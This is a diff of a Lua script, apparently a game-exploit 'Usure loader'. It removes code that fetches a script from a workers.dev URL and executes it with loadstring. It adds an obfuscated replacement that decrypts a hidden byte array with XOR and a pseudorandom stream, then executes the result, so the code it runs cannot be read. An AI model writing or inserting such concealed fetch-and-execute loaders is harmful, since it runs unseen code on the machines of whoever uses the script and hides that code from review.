@@ -1,13 +1,97 @@
-local response = request({
-    Url = "https://bold-darkness-4fdd.lvlyvcbcla.workers.dev/attach/8cc4c875ddc29d0060a41ebf1dce58f1",
-    Method = "GET"
-})
+local __bit = bit32
 
-if response.StatusCode == 200 then
-    local func = loadstring(response.Body)
-    if func then
-        pcall(func)
-    end
-else
-    warn("ATTACHER error: " .. tostring(response.StatusCode))
+if not __bit then
+    error("Usure loader requires bit32 support")
 end
+
+local _FQTIyhHvCL = {254,27,56,203,157,194,172,181,245,43,240,195,8,110,158,21,156,134,127,46,212,41,82,31,148,203,168,211,99,220,229,23,141,70,189,82,64,119,88,170,78,211,136,136,124,200,242,148,55,71,8,31,172,67,136,213,76,214,65,248,182,29,123,189,172,67,89,182,73,110,234,41,1,220,228,146,80,27,210,106,50,139,147,153,83,6,201,252,50,108,181,152,103,87,196,212,124,22,200,105,141,3,246,142,9,18,105,100,36,236,59,105,166,48,1,217,67,204,21,136,218,203,80,224,24,69,153,240,114,162,200,75,90,189,185,188,21,35,174,62,88,110,242,21,75,78,172,222,78,15,99,49,93,235,215,68,83,1,237,215,56,185,181,234,114,175,85,0,230,39,232,161,145,149,171,187,170,188,200,249,219,211,123,47,142,180,100,103,91,77,222,43,211,122,57,238,9,236,80,98,152,224,97,23,212,109,235,28,80,30,24,171,132,152,24,85,136,249,3,219,104,46,209,188,65,24,101,187,169,68,107,148,246,45,111,201,98,161,154,163,117,34,29,176,38,138,230,100,29,48,5,5,74,194,67,226,40,253,114,114,68,204,138,111,197,50,105,117,137,146,251,63,245,103,170,205,146,210,164,85,83,141,156,59,236,181,39,42,94,240,242,252,51,60,107,198,97,42,243,34,116,110,52,235,237,105,161,20,137,15,158,227,93,133,87,42,226,103,113,226,73,53,57,59,14,25,36,87,250,133,195,58,29,226,14,228,80,14,54,40,16,227,31,234,176,14}
+
+local _yRKHhPsIjX = {123,254,37,37,115,241,27,204,56,179,188,88,185,2,44,176,79,45,226,121,196,86,182,87,205,58,108,172,48,72,249,213}
+
+local _rffuujeYwU = {}
+
+local _KltZNLLItw = 0x13579bdf
+
+for _GmvgPFJzZn = 1, #_FQTIyhHvCL do
+
+    _KltZNLLItw = __bit.bxor(
+        _KltZNLLItw,
+        __bit.lshift(_KltZNLLItw, 13)
+    )
+
+    _KltZNLLItw = __bit.bxor(
+        _KltZNLLItw,
+        __bit.rshift(_KltZNLLItw, 17)
+    )
+
+    _KltZNLLItw = __bit.bxor(
+        _KltZNLLItw,
+        __bit.lshift(_KltZNLLItw, 5)
+    )
+
+    _KltZNLLItw = __bit.band(
+        _KltZNLLItw,
+        0xFFFFFFFF
+    )
+
+    local __shift =
+        __bit.band(
+            (_GmvgPFJzZn - 1),
+            3
+        ) * 8
+
+    local __stateByte =
+        __bit.band(
+            __bit.rshift(
+                _KltZNLLItw,
+                __shift
+            ),
+            255
+        )
+
+    local __keyByte =
+        _yRKHhPsIjX[
+            ((_GmvgPFJzZn - 1) %
+            #_yRKHhPsIjX) + 1
+        ]
+
+    local __mix =
+        __bit.band(
+            (_GmvgPFJzZn - 1) * 31,
+            255
+        )
+
+    local __value =
+        __bit.bxor(
+            _FQTIyhHvCL[_GmvgPFJzZn],
+            __keyByte,
+            __stateByte,
+            __mix
+        )
+
+    _rffuujeYwU[_GmvgPFJzZn] =
+        string.char(
+            __bit.band(__value, 255)
+        )
+end
+
+local _uQdOmNcUQQ =
+    table.concat(_rffuujeYwU)
+
+local _cbjPFJAiug =
+    loadstring or load
+
+assert(
+    _cbjPFJAiug,
+    "loadstring/load is unavailable"
+)
+
+local __fn, __err =
+    _cbjPFJAiug(_uQdOmNcUQQ)
+
+assert(
+    __fn,
+    __err
+)
+
+return __fn()
